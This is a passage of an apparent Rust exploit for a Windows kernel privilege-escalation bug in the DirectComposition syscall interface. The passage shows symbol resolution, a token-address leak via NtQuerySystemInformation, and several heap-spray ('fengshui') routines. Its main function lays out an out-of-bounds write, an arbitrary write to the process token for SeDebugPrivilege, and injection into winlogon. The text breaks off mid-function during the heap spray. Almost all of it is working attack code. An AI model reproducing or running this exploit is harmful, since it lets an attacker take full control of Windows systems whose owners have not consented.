#![feature(core_intrinsics)]
use winapi::{
    um::{
        libloaderapi::{GetModuleHandleA, LoadLibraryA, GetProcAddress},
        wingdi::CreateBitmap,
        winnt::{ACCESS_MASK, TOKEN_ADJUST_PRIVILEGES, 
            PROCESS_QUERY_INFORMATION, PROCESS_ALL_ACCESS, MEM_RESERVE, 
            MEM_COMMIT, PAGE_EXECUTE_READWRITE},
        processthreadsapi::{GetCurrentProcessId, OpenProcess, OpenProcessToken, 
            CreateRemoteThread, InitializeProcThreadAttributeList, PROC_THREAD_ATTRIBUTE_LIST, UpdateProcThreadAttribute, CreateProcessW, PROCESS_INFORMATION},
        handleapi::{CloseHandle, INVALID_HANDLE_VALUE},
        errhandlingapi::GetLastError,
        winsvc::*,
        winbase::*,
        securitybaseapi::RevertToSelf,
        minwinbase::SECURITY_ATTRIBUTES,
        memoryapi::{VirtualAllocEx, WriteProcessMemory, VirtualProtectEx},
        tlhelp32::{CreateToolhelp32Snapshot, Process32FirstW, Process32NextW, 
            PROCESSENTRY32W, TH32CS_SNAPPROCESS}},
    ctypes::c_void,
    shared::{
        ntdef::{HANDLE, NTSTATUS, NT_SUCCESS, PHANDLE, PVOID, NULL},
        minwindef::{LPVOID, LPDWORD, LPHANDLE, DWORD, FALSE, TRUE, UCHAR, ULONG, USHORT},
        ntstatus::{STATUS_INFO_LENGTH_MISMATCH, STATUS_BUFFER_TOO_SMALL}}};
use std::{
    ffi::{CString, OsString},
    mem::transmute,
    process::exit,
    ptr::null_mut,
    intrinsics::breakpoint,
    sync::{RwLockReadGuard, RwLockWriteGuard, RwLock}, os::windows::prelude::OsStringExt};
use lazy_static::lazy_static;
use ntapi::ntexapi::{NtQuerySystemInformation, SYSTEM_HANDLE_INFORMATION,
    PSYSTEM_HANDLE_INFORMATION, SystemHandleInformation};

type NtDCompositionCreateChannel = extern "stdcall" fn(
    pchannelhandle: LPHANDLE, psectionsize: *mut usize,
    psectionbasemapinprogress: *mut LPVOID) -> NTSTATUS;
type NtDCompositionProcessChannelBatchBuffer = extern "stdcall" fn(
    hchannel: HANDLE, dwstart: DWORD, pargs1: LPDWORD, pargs2: LPDWORD
) -> NTSTATUS;
type NtDCompositionCommitChannel = extern "stdcall" fn(
    hchannel: HANDLE, poutargs1: LPDWORD, poutargs2: LPDWORD, dwstart: DWORD,
    hsynchobj: HANDLE
) -> NTSTATUS;
	
#[repr(C)]
enum DCOMPOSITION_COMMAND_ID
{
	ProcessCommandBufferIterator,
	CreateResource,
	OpenSharedResource,
	ReleaseResource,
	GetAnimationTime,
	CapturePointer,
	OpenSharedResourceHandle,
	SetResourceCallbackId,
	SetResourceIntegerProperty,
	SetResourceFloatProperty,
	SetResourceHandleProperty,
	SetResourceHandleArrayProperty,
	SetResourceBufferProperty,
	SetResourceReferenceProperty,
	SetResourceReferenceArrayProperty,
	SetResourceAnimationProperty,
	SetResourceDeletedNotificationTag,
	AddVisualChild,
	RedirectMouseToHwnd,
	SetVisualInputSink,
	RemoveVisualChild
}

//address of win32u imports
#[derive(Clone)]
struct WIN32IMPORTS {
    createchannel: usize,
    processchannelbatchbuffer: usize,
    commitchannel: usize
}

#[repr(C)]
struct SYSTEM_HANDLE_TABLE_ENTRY_INFO
{
    processid: ULONG,
	objecttypenumber: UCHAR,
	flags: UCHAR,
	handle: USHORT,
	object: PVOID,
	grantedaccess: ACCESS_MASK
}

//saved handles
lazy_static!(
    static ref FS0HANDLE : RwLock<usize> = RwLock::new(0);
    static ref FS0MAP : RwLock<usize> = RwLock::new(0);
    static ref FS1HANDLE : RwLock<usize> = RwLock::new(0);
    static ref FS1MAP : RwLock<usize> = RwLock::new(0);
    static ref FS2HANDLE : RwLock<usize> = RwLock::new(0);
    static ref FS2MAP : RwLock<usize> = RwLock::new(0);
);

//knobs and sliders
//(in my head it's a weird granular synth)
static NUMBITMAPS: u32 = 0x1000;
static FENGSHUI0NUMPROPS: u32 = 0x2;
static FENGSHUI0NUMRES: u32 = 0x800;
static FENGSHUI1NUMPROPS: u32 = 0x8;
static FENGSHUI1NUMRES: u32 = 0x300;
static FENGSHUI2NUMRES: u32 = 0x200;
static FENGSHUI3START: u32 = 0x10;
static FENGSHUI3END: u32 = 0x700;
static FENGSHUI4START: u32 = 0x100;
//static FENGSHUI4END: u32 = 0x300;
static OOBNUMATTEMPTS: usize = 0xa;
static TOKEN_PRIVILEGES_OFFSET: usize = 0x40;

static PROC_THREAD_ATTRIBUTE_PARENT_PROCESS: usize = 0x00020000;

fn main() {
    unsafe {
        println!(">Getting token address");
        let w32imports = resolve_symbols();
        let tokenptr: usize = gettokenaddr();
        if tokenptr == 0 {
            println!("Failed to get token address");
            exit(1);
        }
        //defrag with bitmaps
        println!(">Defragmenting heap");
        defrag();
        //make first set of cpropertysetmarshaler
        println!(">Making first set of fengshui allocations");
        fengshui0(w32imports.clone());
        //make a bunch of tabletransfereffect marshaler to place mock 
        //properties on the heap
        println!(">Making second set of fengshui allocations");
        fengshui1(w32imports.clone());
        //make a bunch of propertysetmarshaler
        println!(">Making third set of fengshui allocations");
        fengshui2(w32imports.clone());
        //make holes in 0
        println!(">Making holes in one");
        fengshui3(w32imports.clone());
        //make holes in 1
        println!(">Making holes in two");
        fengshui4(w32imports.clone());
        //make two more properties for 2
        println!(">Attempting to fill holes");
        fengshui5(w32imports.clone());
        //attempt to write out-of-bounds using two
        println!(">Attempting to write out of bounds with confused CPropertySetMarshaler objects");
        let writers = oobwrite(w32imports.clone(), tokenptr);
        //attempt to write to an arbitrary address using corrupted
        //propertysetmarshaler of 0 and 1
        //use arbitrary write primitive to modify token and get SeDebugPrivilege
        println!(">Attempting arbitrary write primitive with corrupted CPropertySetMarshaler objects");
        arbitrarywrite(w32imports.clone());
        println!(">Cleaning up and hanging out for a sec");
        cleanup(w32imports.clone(), writers.clone());
        //chill out for a second in case CApplicationChannel is being slow
        std::thread::sleep(std::time::Duration::from_secs(1));
        //one option
        winlogoninject();
	//we can have PROCESS_ALL_ACCESS now but this one would require additional steps...
        //processmagic(true);
    }
}

//only a few imports for this one
unsafe fn resolve_symbols() -> WIN32IMPORTS {
    let u32str = CString::new("user32.dll").expect("CString::new failed");
    let w32str = CString::new("win32u").expect("CString::new failed");
    let screatechannel= CString::new(
        "NtDCompositionCreateChannel").expect("CString::new failed");
    let scommitchannel= CString::new(
        "NtDCompositionCommitChannel").expect("CString::new failed");
    let sprocessbuf = CString::new(
        "NtDCompositionProcessChannelBatchBuffer").expect("CString::new failed");
    LoadLibraryA(u32str.as_ptr());
    let hndwn32u = GetModuleHandleA(w32str.as_ptr());
    let szcreatechannel: usize = GetProcAddress(
        hndwn32u, screatechannel.as_ptr()) as usize;
    let szcommmitchannel: usize = GetProcAddress(
        hndwn32u, scommitchannel.as_ptr()) as usize;
    let szprocessbuf: usize = GetProcAddress(
        hndwn32u, sprocessbuf.as_ptr()) as usize;
    if szcreatechannel == 0 || szcommmitchannel == 0 || szprocessbuf == 0 {
        println!("Could not resolve win32 functions");
        exit(1)
    }
    let w32imports: WIN32IMPORTS = WIN32IMPORTS {
        createchannel: szcreatechannel,
        processchannelbatchbuffer: szprocessbuf,
        commitchannel: szcommmitchannel,
    };
    w32imports
}

unsafe fn gethandleaddr(handle: HANDLE, htype: DWORD) -> usize {
    let mut handlebuffer = Vec::with_capacity(0x40000);
    let mut outlength: u32 = 0;
    let ntstatus: NTSTATUS = NtQuerySystemInformation(
        SystemHandleInformation, handlebuffer.as_mut_ptr() as PVOID, handlebuffer.capacity() as ULONG, &mut outlength);
    if ntstatus == STATUS_INFO_LENGTH_MISMATCH || ntstatus == STATUS_BUFFER_TOO_SMALL{
        handlebuffer.reserve(outlength as usize);
        NtQuerySystemInformation(SystemHandleInformation, handlebuffer.as_mut_ptr() as PVOID, handlebuffer.capacity() as ULONG, &mut outlength);
    }
    if NT_SUCCESS(ntstatus) {
        handlebuffer.set_len(outlength as usize);
    }
    if *((&handlebuffer as *const _) as *mut u32) == 0 {
        println!("NtQuerySystemInformation failed");
        exit(1);
    }
    //ahhhhh
    let psyshandleinfo: PSYSTEM_HANDLE_INFORMATION = handlebuffer.as_mut_ptr();
    let syshandleinfo = *psyshandleinfo;
    let numhandles = syshandleinfo.NumberOfHandles;
    let pszhandles = handlebuffer.as_mut_ptr() as usize;
    for i in 0x0usize..numhandles as usize {
        let ph = ((pszhandles + 8 + (i*0x18)) as *mut usize) as *mut SYSTEM_HANDLE_TABLE_ENTRY_INFO;
        if (*ph).processid == GetCurrentProcessId() && (*ph).objecttypenumber == htype as u8 {
            if *((&handle as *const _) as *mut u16) == (*ph).handle {
                let obj: usize = (*ph).object as usize;
                return obj
            }
        }
    }
    0
}

unsafe fn gettokenaddr() -> usize {
    let mut htoken: HANDLE = null_mut();
    let hproc: HANDLE = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, GetCurrentProcessId());
    let ntstatus = OpenProcessToken(hproc, TOKEN_ADJUST_PRIVILEGES, &mut htoken);
    if !NT_SUCCESS(ntstatus) {
        println!("OpenProcessToken failed");
        exit(1);
    }
    let tokenaddr: usize = gethandleaddr(htoken, 0x5);
    println!("\tFound process token at {:#x}", tokenaddr);
    tokenaddr
}

unsafe fn defrag() {
    let lpbits: [u16; 0x100] = [0x41; 0x100];
    for _ in 0..NUMBITMAPS {
        let cbresult = CreateBitmap(0x1a, 1, 1, 0x20, lpbits.as_ptr() as *const c_void);
        if cbresult.is_null() {
            println!("CreateBitmap failed");
            exit(1);
        }
        //println!("{:#?}", cbresult);
    }
}

unsafe fn fengshui0(win32imports: WIN32IMPORTS) {
    //set up some variables
    let spraysize: u32 = FENGSHUI0NUMRES;
    let numproperties: u32 = FENGSHUI0NUMPROPS;
    //****change this****
    let commandbuffsize: u32 = (numproperties * 0x24) + 0x10;
    let channelbuffsize: u32 = spraysize * commandbuffsize;
    let sectionsize: u32 = channelbuffsize + 0x1000;
    let pmappedaddr: LPVOID = null_mut();
    let mut hchannel: HANDLE = null_mut();
    let lockobj: u8 = 0;
    let hsynchobj: HANDLE = (&lockobj as *const _) as HANDLE;
    let dwargs1: DWORD = 0;
    let dwargs2: DWORD = 0;
    let lpdwargs1: LPDWORD = (&dwargs1 as *const _) as *mut u32;
    let lpdwargs2: LPDWORD = (&dwargs2 as *const _) as *mut u32;
    //import library functions
    let createchannel: NtDCompositionCreateChannel = transmute(
        win32imports.createchannel);
    let processchannelbatchbuffer: NtDCompositionProcessChannelBatchBuffer = 
        transmute(win32imports.processchannelbatchbuffer);
    let commitchannel: NtDCompositionCommitChannel = transmute(
        win32imports.commitchannel);
    //create channel
    let mut ntstatus = createchannel(
        (&hchannel as *const _) as *mut HANDLE,
        (&sectionsize as *const _) as *mut usize,
        (&pmappedaddr as *const _) as *mut LPVOID);
    if !NT_SUCCESS(ntstatus) {
        println!("\tCreateChannel failed: {:#x}", ntstatus);
        exit(1);
    }
    println!("\tChannel handle: {:#x}",
        *((&hchannel as *const _) as *mut usize) as usize);
    let qwpmappedaddr: usize = *((&pmappedaddr as *const _) as *mut usize) as usize;
    //save the channel handle for later lol
    let phchannel: PHANDLE = &mut hchannel;
    let mut gpfs0handle: RwLockWriteGuard<usize> = FS0HANDLE.write().unwrap();
    *gpfs0handle = *phchannel as usize;
    drop(gpfs0handle);
    //save the buffer address
    let mut gpfs0map: RwLockWriteGuard<usize> = FS0MAP.write().unwrap();
    *gpfs0map = qwpmappedaddr;
    drop(qwpmappedaddr);
    println!("\tMapped section base address: {:#x}", qwpmappedaddr);
    for i in 0..spraysize {
        let hresource: HANDLE = null_mut();
        let buffoffs: usize = (i * commandbuffsize as u32) as usize;
        *((&hresource as *const _) as *mut usize) = 0x1 + i as usize;
        *((qwpmappedaddr + buffoffs) as *mut u8) = DCOMPOSITION_COMMAND_ID::CreateResource as u8;
        *((qwpmappedaddr + buffoffs + 4) as *mut u32) = *((&hresource as *const _) as *mut u32);
        *((qwpmappedaddr + buffoffs + 8) as *mut u8) = 0x74;
        *((qwpmappedaddr + buffoffs + 0xc) as *mut i32) = FALSE;
        //****also add properties****
        //add properties:
        for j in 0..numproperties {
            let propertyid: usize = j as usize;
            *((qwpmappedaddr + buffoffs + (propertyid*0x24) + 0x10) as *mut u8) = DCOMPOSITION_COMMAND_ID::SetResourceBufferProperty as u8;
            *((qwpmappedaddr + buffoffs + (propertyid*0x24) + 0x14) as *mut u32) = *((&hresource as *const _) as *mut u32);
            //propertyid
            *((qwpmappedaddr + buffoffs + (propertyid*0x24) + 0x18) as *mut u32) = 0x0;
            //propertysize
            *((qwpmappedaddr + buffoffs + (propertyid*0x24) + 0x1c) as *mut u32) = 0x14;
            *((qwpmappedaddr + buffoffs + (propertyid*0x24) + 0x20) as *mut u32) = propertyid as u32;
            *((qwpmappedaddr + buffoffs + (propertyid*0x24) + 0x24) as *mut u32) = (propertyid * 8) as u32;
            //type
            *((qwpmappedaddr + buffoffs + (propertyid*0x24) + 0x28) as *mut u32) = 0x23;
            *((qwpmappedaddr + buffoffs + (propertyid*0x24) + 0x2c) as *mut u32) = 0xcafebabe;
            *((qwpmappedaddr + buffoffs + (propertyid*0x24) + 0x30) as *mut u32) = 0xcafebabe;
        }
    }
    ntstatus = processchannelbatchbuffer(hchannel, channelbuffsize, lpdwargs1, lpdwargs2);
    if !NT_SUCCESS(ntstatus) {
        println!("\tProcess channel batch buffer failed: {:#x}", ntstatus);
        println!("\t{:#x} {:#x}", *lpdwargs1, *lpdwargs2);
        exit(1);
    }
    println!("\t{:#x} {:#x}", *lpdwargs1, *lpdwargs2);
    ntstatus = commitchannel(hchannel, lpdwargs1, lpdwargs2, 0x0, hsynchobj);
    //breakpoint();
    if !NT_SUCCESS(ntstatus) {
        println!("\tCommit channel failed: {:#x}", ntstatus);
        exit(1);
    }
}

unsafe fn fengshui1(win32imports: WIN32IMPORTS) {
        //set up some variables
    let commandbuffsize: u32 = (FENGSHUI1NUMPROPS *8) + 0x20;
    let channelbuffsize: u32 = commandbuffsize * FENGSHUI1NUMRES;
    let sectionsize: u32 = channelbuffsize + 0x1000;
    let pmappedaddr: LPVOID = null_mut();
    let mut hchannel: HANDLE = null_mut();
    let lockobj: u8 = 0;
    let hsynchobj: HANDLE = (&lockobj as *const _) as HANDLE;
    let dwargs1: DWORD = 0;
    let dwargs2: DWORD = 0;
    //unsafe{} af
    let lpdwargs1: LPDWORD = (&dwargs1 as *const _) as *mut u32;
    let lpdwargs2: LPDWORD = (&dwargs2 as *const _) as *mut u32;
    //import library functions
    let createchannel: NtDCompositionCreateChannel = transmute(
        win32imports.createchannel);
    let commitchannel: NtDCompositionCommitChannel = transmute(
        win32imports.commitchannel);
    let processchannelbatchbuffer: NtDCompositionProcessChannelBatchBuffer = 
        transmute(win32imports.processchannelbatchbuffer);
    //create channel
    let mut ntstatus = createchannel(
        (&hchannel as *const _) as *mut HANDLE,
        (&sectionsize as *const _) as *mut usize,
        (&pmappedaddr as *const _) as *mut LPVOID);
    if !NT_SUCCESS(ntstatus) {
        println!("\tCreateChannel failed: {:#x}", ntstatus);
        exit(1);
    }
    println!("\tChannel handle: {:#x}",
        *((&hchannel as *const _) as *mut usize) as usize);
    let qwpmappedaddr: usize = *((&pmappedaddr as *const _) as *mut usize) as usize;
    //save the channel handle for later lol
    let phchannel: PHANDLE = &mut hchannel;
    let mut gpfs1handle: RwLockWriteGuard<usize> = FS1HANDLE.write().unwrap();
    *gpfs1handle = *phchannel as usize;
    drop(gpfs1handle);
    //save the buffer address
    let mut gpfs1map: RwLockWriteGuard<usize> = FS1MAP.write().unwrap();
    *gpfs1map = qwpmappedaddr;
    drop(qwpmappedaddr);
    println!("\tMapped section base address: {:#x}", qwpmappedaddr);
    //this is a kind of a handy api... you basically have a dispatch table, and
    //you can batch together calls to functions in this table, in a single 
    //syscall, to minimize costly ring0-ring3 roundtrip. parameters are put 
    //into one contiguous buffer. an api just for  heap spray :D
    for i in 0..FENGSHUI1NUMRES {
        let buffoffs: usize = (i * commandbuffsize) as usize;
        let resourceid: u32 = 1 + i;
        let hresource: HANDLE = null_mut();
        *((&hresource as *const _) as *mut usize) = resourceid as usize;
        *((qwpmappedaddr + buffoffs) as *mut u8) = DCOMPOSITION_COMMAND_ID::CreateResource as u8;
        *((qwpmappedaddr + buffoffs + 4) as *mut u32) = *((&hresource as *const _) as *mut u32);
        //CExpressionMarshaler
        *((qwpmappedaddr + buffoffs + 8) as *mut u8) = 0x92;
        *((qwpmappedaddr + buffoffs + 0xc) as *mut i32) = FALSE;
        //add a property:
        *((qwpmappedaddr + buffoffs + 0x10) as *mut u8) = DCOMPOSITION_COMMAND_ID::SetResourceBufferProperty as u8;
        *((qwpmappedaddr + buffoffs + 0x14) as *mut u32) = *((&hresource as *const _) as *mut u32);
        let properties: usize = FENGSHUI1NUMPROPS as usize;
        *((qwpmappedaddr + buffoffs + 0x18) as *mut u32) = 0x0;
        *((qwpmappedaddr + buffoffs + 0x1c) as *mut u32) = FENGSHUI1NUMPROPS * 8;
        for j in 0usize..properties {
            *((qwpmappedaddr + buffoffs + 0x20 + j*8) as *mut u64) = 0x200000b800000023;
        }
    }
    ntstatus = processchannelbatchbuffer(hchannel, channelbuffsize, lpdwargs1, lpdwargs2);
    if !NT_SUCCESS(ntstatus) {
        println!("\tProcess channel batch buffer failed: {:#x}", ntstatus);
        println!("{:#x} {:#x}", *lpdwargs1, *lpdwargs2);
        exit(1);
    }
    println!("{:#x} {:#x}", *lpdwargs1, *lpdwargs2);
    ntstatus = commitchannel(hchannel, lpdwargs1, lpdwargs2, 0, hsynchobj);
    if !NT_SUCCESS(ntstatus) {
        println!("\tCommit channel failed: {:#x}", ntstatus);
        exit(1);
    }
}

unsafe fn fengshui2(win32imports: WIN32IMPORTS) {
    //set up some variables
    let spraysize: u32 = FENGSHUI2NUMRES;
    let numproperties: u32 = 5;
    //****change this****
    let commandbuffsize: u32 = (numproperties * 0x2c) + 0x10;
    let channelbuffsize: u32 = spraysize * commandbuffsize;
    let sectionsize: u32 = channelbuffsize + 0x1000;
    let pmappedaddr: LPVOID = null_mut();
    let mut hchannel: HANDLE = null_mut();
    let lockobj: u8 = 0;
    let hsynchobj: HANDLE = (&lockobj as *const _) as HANDLE;
    let dwargs1: DWORD = 0;
    let dwargs2: DWORD = 0;
    let lpdwargs1: LPDWORD = (&dwargs1 as *const _) as *mut u32;
    let lpdwargs2: LPDWORD = (&dwargs2 as *const _) as *mut u32;
    //import library functions
    let createchannel: NtDCompositionCreateChannel = transmute(
        win32imports.createchannel);
    let processchannelbatchbuffer: NtDCompositionProcessChannelBatchBuffer = 
        transmute(win32imports.processchannelbatchbuffer);
    let commitchannel: NtDCompositionCommitChannel = transmute(
        win32imports.commitchannel);
    //create channel
    let mut ntstatus = createchannel(
        (&hchannel as *const _) as *mut HANDLE,
        (&sectionsize as *const _) as *mut usize,
        (&pmappedaddr as *const _) as *mut LPVOID);
    if !NT_SUCCESS(ntstatus) {
        println!("\tCreateChannel failed: {:#x}", ntstatus);
        exit(1);
    }
    println!("\tChannel handle: {:#x}",
        *((&hchannel as *const _) as *mut usize) as usize);
    let qwpmappedaddr: usize = *((&pmappedaddr as *const _) as *mut usize) as usize;
    //save the channel handle for later lol
    let phchannel: PHANDLE = &mut hchannel;
    let mut gpfs2handle: RwLockWriteGuard<usize> = FS2HANDLE.write().unwrap();
    *gpfs2handle = *phchannel as usize;
    drop(gpfs2handle);
    //save the buffer address
    let mut gpfs2map: RwLockWriteGuard<usize> = FS2MAP.write().unwrap();
    *gpfs2map = qwpmappedaddr;
    drop(qwpmappedaddr);
    println!("\tMapped section base address: {:#x}", qwpmappedaddr);
    for i in 0..spraysize {
        let hresource: HANDLE = null_mut();
        let buffoffs: usize = (i * commandbuffsize as u32) as usize;
        *((&hresource as *const _) as *mut usize) = 0x1 + i as usize;
        *((qwpmappedaddr + buffoffs) as *mut u8) = DCOMPOSITION_COMMAND_ID::CreateResource as u8;
        *((qwpmappedaddr + buffoffs + 4) as *mut u32) = *((&hresource as *const _) as *mut u32);
        *((qwpmappedaddr + buffoffs + 8) as *mut u8) = 0x74;
        *((qwpmappedaddr + buffoffs + 0xc) as *mut i32) = FALSE;
        //****also add properties****
        //add properties:
        for j in 0..numproperties {
            let propertyid: usize = j as usize;
            *((qwpmappedaddr + buffoffs + (propertyid*0x2c) + 0x10) as *mut u8) = DCOMPOSITION_COMMAND_ID::SetResourceBufferProperty as u8;
            *((qwpmappedaddr + buffoffs + (propertyid*0x2c) + 0x14) as *mut u32) = *((&hresource as *const _) as *mut u32);
            //propertyid
            *((qwpmappedaddr + buffoffs + (propertyid*0x2c) + 0x18) as *mut u32) = 0x0;
            //propertysize
            *((qwpmappedaddr + buffoffs + (propertyid*0x2c) + 0x1c) as *mut u32) = 0x1c;
            *((qwpmappedaddr + buffoffs + (propertyid*0x2c) + 0x20) as *mut u32) = propertyid as u32;
            *((qwpmappedaddr + buffoffs + (propertyid*0x2c) + 0x24) as *mut u32) = (propertyid * 0x10) as u32;
            //type
            *((qwpmappedaddr + buffoffs + (propertyid*0x2c) + 0x28) as *mut u32) = 0x45;
            *((qwpmappedaddr + buffoffs + (propertyid*0x2c) + 0x2c) as *mut u32) = 0x00000023;
            *((qwpmappedaddr + buffoffs + (propertyid*0x2c) + 0x30) as *mut u32) = 0x200000b8;
            *((qwpmappedaddr + buffoffs + (propertyid*0x2c) + 0x34) as *mut u32) = 0x00000023;
            *((qwpmappedaddr + buffoffs + (propertyid*0x2c) + 0x38) as *mut u32) = 0x200000b8;
        }
    }
    ntstatus = processchannelbatchbuffer(hchannel, channelbuffsize, lpdwargs1, lpdwargs2);
    if !NT_SUCCESS(ntstatus) {
        println!("\tProcess channel batch buffer failed: {:#x}", ntstatus);
        println!("\t{:#x} {:#x}", *lpdwargs1, *lpdwargs2);
        exit(1);
    }
    println!("\t{:#x} {:#x}", *lpdwargs1, *lpdwargs2);
    ntstatus = commitchannel(hchannel, lpdwargs1, lpdwargs2, 0x0, hsynchobj);
    //breakpoint();
    if !NT_SUCCESS(ntstatus) {
        println!("\tCommit channel failed: {:#x}", ntstatus);
        exit(1);
    }
}

unsafe fn fengshui3(win32imports: WIN32IMPORTS) {
    //set up some variables
    let commandbuffsize: u32 = 0x8;
    let spraysize = (FENGSHUI3END - FENGSHUI3START) / 2;
    let channelbuffsize: u32 = spraysize * commandbuffsize;
    let hchannel: HANDLE = null_mut();
    let lockobj: u8 = 0;
    let hsynchobj: HANDLE = (&lockobj as *const _) as HANDLE;
    let dwargs1: DWORD = 0;
    let dwargs2: DWORD = 0;
    let lpdwargs1: LPDWORD = (&dwargs1 as *const _) as *mut u32;
    let lpdwargs2: LPDWORD = (&dwargs2 as *const _) as *mut u32;
    //import library functions
    let processchannelbatchbuffer: NtDCompositionProcessChannelBatchBuffer = 
        transmute(win32imports.processchannelbatchbuffer);
    let commitchannel: NtDCompositionCommitChannel = transmute(
        win32imports.commitchannel);
    let gfs0pmappedaddr: RwLockReadGuard<usize> = FS0MAP.read().unwrap();
    let qwpmappedaddr: usize = *gfs0pmappedaddr;
    let gps0handle: RwLockReadGuard<usize> = FS0HANDLE.read().unwrap();
    *((&hchannel as *const _) as *mut usize) = *gps0handle;
    println!("\tMapped section base address: {:#x}", qwpmappedaddr);
    //let spraysize: usize = 0x500;
    println!("\t{:#x} {:#x}", *lpdwargs1, *lpdwargs2);
    for i in (FENGSHUI3START..FENGSHUI3END).step_by(2) {
        let hresource: HANDLE = null_mut();
        let buffindex: usize = (i - FENGSHUI3START ) as usize / 0x2;
        let buffoffs: usize = buffindex * 8; 
        let propertyid: usize = i as usize;
        *((&hresource as *const _) as *mut usize) = propertyid;
        *((qwpmappedaddr + buffoffs) as *mut u32) = DCOMPOSITION_COMMAND_ID::ReleaseResource as u32;
        *((qwpmappedaddr + buffoffs + 4) as *mut u32) = *((&hresource as *const _) as *mut u32);
    }
    let mut ntstatus = processchannelbatchbuffer(hchannel, channelbuffsize, lpdwargs1, lpdwargs2);
    if !NT_SUCCESS(ntstatus) {
        println!("\tProcess channel batch buffer failed: {:#x}", ntstatus);
        println!("\t{:#x} {:#x}", *lpdwargs1, *lpdwargs2);
        exit(1);
    }
    println!("\t{:#x} {:#x}", *lpdwargs1, *lpdwargs2);
    ntstatus = commitchannel(hchannel, lpdwargs1, lpdwargs2, 0x0, hsynchobj);
    //breakpoint();
    if !NT_SUCCESS(ntstatus) {
        println!("\tCommit channel failed: {:#x}", ntstatus);
        exit(1);
    }
}

unsafe fn fengshui4(win32imports: WIN32IMPORTS) {
    //set up some variables
    let commandbuffsize: u32 = 0x8;
    let spraysize = FENGSHUI1NUMRES - FENGSHUI4START;
    let channelbuffsize: u32 = spraysize * commandbuffsize;
    let hchannel: HANDLE = null_mut();
    let lockobj: u8 = 0;
    let hsynchobj: HANDLE = (&lockobj as *const _) as HANDLE;
    let dwargs1: DWORD = 0;
    let dwargs2: DWORD = 0;
    let lpdwargs1: LPDWORD = (&dwargs1 as *const _) as *mut u32;
    let lpdwargs2: LPDWORD = (&dwargs2 as *const _) as *mut u32;
    //import library functions
    let processchannelbatchbuffer: NtDCompositionProcessChannelBatchBuffer = 
        transmute(win32imports.processchannelbatchbuffer);
    let commitchannel: NtDCompositionCommitChannel = transmute(
        win32imports.commitchannel);
    let gfs1pmappedaddr: RwLockReadGuard<usize> = FS1MAP.read().unwrap();
    let qwpmappedaddr: usize = *gfs1pmappedaddr;
    let gps1handle: RwLockReadGuard<usize> = FS1HANDLE.read().unwrap();
    *((&hchannel as *const _) as *mut usize) = *gps1handle;
    println!("\tMapped section base address: {:#x}", qwpmappedaddr);
    //let spraysize: usize = 0x500;
    println!("\t{:#x} {:#x}", *lpdwargs1, *lpdwargs2);
    for i in FENGSHUI4START..FENGSHUI1NUMRES {
        let hresource: HANDLE = null_mut();
        let buffindex: usize = (i-FENGSHUI4START) as usize;
        let buffoffs: usize = buffindex * 8; 
        let propertyid: usize = 1+i as usize;
        *((&hresource as *const _) as *mut usize) = propertyid;
        *((qwpmappedaddr + buffoffs) as *mut u32) = DCOMPOSITION_COMMAND_ID::ReleaseResource as u32;
        *((qwpmappedaddr + buffoffs + 4) as *mut u32) = *((&hresource as *const _) as *mut u32);
    }
    let mut ntstatus = processchannelbatchbuffer(hchannel, channelbuffsize, lpdwargs1, lpdwargs2);
    if !NT_SUCCESS(ntstatus) {
        println!("\tProcess channel batch buffer failed: {:#x}", ntstatus);
        println!("\t{:#x} {:#x}", *lpdwargs1, *lpdwargs2);
        exit(1);
    }
    println!("\t{:#x} {:#x}", *lpdwargs1, *lpdwargs2);
    ntstatus = commitchannel(hchannel, lpdwargs1, lpdwargs2, 0x0, hsynchobj);
    //breakpoint();
    if !NT_SUCCESS(ntstatus) {
        println!("\tCommit channel failed: {:#x}", ntstatus);
        exit(1);
    }
}

unsafe fn fengshui5(win32imports: WIN32IMPORTS) {
    //set up some variables
    let hchannel: HANDLE = null_mut();
    let lockobj: u8 = 0;
    let hsynchobj: HANDLE = (&lockobj as *const _) as HANDLE;
    let dwargs1: DWORD = 0;
    let dwargs2: DWORD = 0;
    let lpdwargs1: LPDWORD = (&dwargs1 as *const _) as *mut u32;
    let lpdwargs2: LPDWORD = (&dwargs2 as *const _) as *mut u32;
    //import library functions
    let processchannelbatchbuffer: NtDCompositionProcessChannelBatchBuffer = 
        transmute(win32imports.processchannelbatchbuffer);
    let commitchannel: NtDCompositionCommitChannel = transmute(
        win32imports.commitchannel);
    let gfs2pmappedaddr: RwLockReadGuard<usize> = FS2MAP.read().unwrap();
    let qwpmappedaddr: usize = *gfs2pmappedaddr;
    let gps2handle: RwLockReadGuard<usize> = FS2HANDLE.read().unwrap();
    *((&hchannel as *const _) as *mut usize) = *gps2handle;
    println!("\tMapped section base address: {:#x}", qwpmappedaddr);
    let spraysize: usize = FENGSHUI2NUMRES as usize;
    let channelbuffsize = spraysize * 0x48;
    println!("\t{:#x} {:#x}", *lpdwargs1, *lpdwargs2);
    //std::thread::sleep(std::time::Duration::from_secs(1));
    //breakpoint();
    for i in 0..spraysize {
        let hresource: HANDLE = null_mut();
        let propertyid: usize = 0x1 + i;
        let buffoffs: usize = i * 0x48; 
        *((&hresource as *const _) as *mut usize) = propertyid;
        *((qwpmappedaddr + buffoffs) as *mut u32) = DCOMPOSITION_COMMAND_ID::SetResourceBufferProperty as u32;
        *((qwpmappedaddr + buffoffs + 0x4) as *mut u32) = *((&hresource as *const _) as *mut u32);
        *((qwpmappedaddr + buffoffs + 0x8) as *mut u32) = 0x0;
        *((qwpmappedaddr + buffoffs + 0xc) as *mut u32) = 0x14;
        *((qwpmappedaddr + buffoffs + 0x10) as *mut u32) = 0x5;
        *((qwpmappedaddr + buffoffs + 0x14) as *mut u32) = 0x50;
        *((qwpmappedaddr + buffoffs + 0x18) as *mut u32) = 0x23;
        *((qwpmappedaddr + buffoffs + 0x1c) as *mut u32) = 0xcafebabe;
        *((qwpmappedaddr + buffoffs + 0x20) as *mut u32) = 0xcafebabe;
        *((qwpmappedaddr + buffoffs + 0x24) as *mut u32) = DCOMPOSITION_COMMAND_ID::SetResourceBufferProperty as u32;
        *((qwpmappedaddr + buffoffs + 0x28) as *mut u32) = *((&hresource as *const _) as *mut u32);
        *((qwpmappedaddr + buffoffs + 0x2c) as *mut u32) = 0x0;
        *((qwpmappedaddr + buffoffs + 0x30) as *mut u32) = 0x14;
        *((qwpmappedaddr + buffoffs + 0x34) as *mut u32) = 0x6;
        *((qwpmappedaddr + buffoffs + 0x38) as *mut u32) = 0x58;
        *((qwpmappedaddr + buffoffs + 0x3c) as *mut u32) = 0x23;
        *((qwpmappedaddr + buffoffs + 0x40) as *mut u32) = 0xcafebabe;
